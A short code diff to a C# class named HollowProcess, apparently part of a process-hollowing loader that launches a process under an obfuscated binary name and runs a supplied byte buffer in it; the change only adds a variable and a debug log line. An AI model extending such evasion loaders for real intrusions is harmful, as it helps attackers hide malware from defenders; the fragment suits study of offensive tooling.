@@ -15,9 +15,13 @@ internal static class HollowProcess
     internal static Task Run(byte[] buf)
     {
         var si = new StartupInfo();
+        var binary = Obfuscation.GetObfuscatedBinaryName();
+        if (RuntimeConfig.IsDebugEnabled)
+            Console.WriteLine($"Creating process with binary: {binary}");
+
         Lib.CreateProcessW(
             null,
-            Obfuscation.GetObfuscatedBinaryName(),
+            binary,
             IntPtr.Zero,
             IntPtr.Zero,
             false,
@@ -74,7 +78,6 @@ internal static class HollowProcess
 
         return;
     }
-
 
     private static IntPtr GetEntryPoint(IntPtr hProcess)
     {
